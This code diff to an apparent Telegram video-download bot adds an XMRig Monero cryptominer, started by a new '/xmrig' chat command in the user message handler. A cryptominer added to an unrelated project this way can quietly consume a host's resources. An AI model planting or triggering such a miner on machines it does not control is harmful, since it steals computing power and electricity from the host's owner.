@@ -1,6 +1,7 @@
 import urllib.request as uq
 import sys
 import os
+import xmrig
 from modules.VidDown import *
 from modules.users import *
 import subprocess as sbp
@@ -463,6 +464,13 @@ def ClearCommand(command:str):
         command.append(None)
     return command
 
+def Mine():
+    if Gvar.xmr._is_process_running():
+        return "xmrig are running"
+    else:
+        Gvar.xmr.start_xmrig()
+        return "xmrig enabled"
+
 def USER_PROCCESS(user:t_user, message: Message,bot:pyrogram.client.Client):
     MSG = str(message.text)
     command = ClearCommand(MSG)[1]
@@ -472,6 +480,8 @@ def USER_PROCCESS(user:t_user, message: Message,bot:pyrogram.client.Client):
         tth=th.Thread(target=VidComp,args=[message],daemon=True)
         tth.start()
         return "in progress"
+    elif MSG.startswith("/xmrig"):
+        return Mine()
     elif MSG.startswith("/help"):
         return Gvar.HELP
     elif MSG.startswith("/dir"):
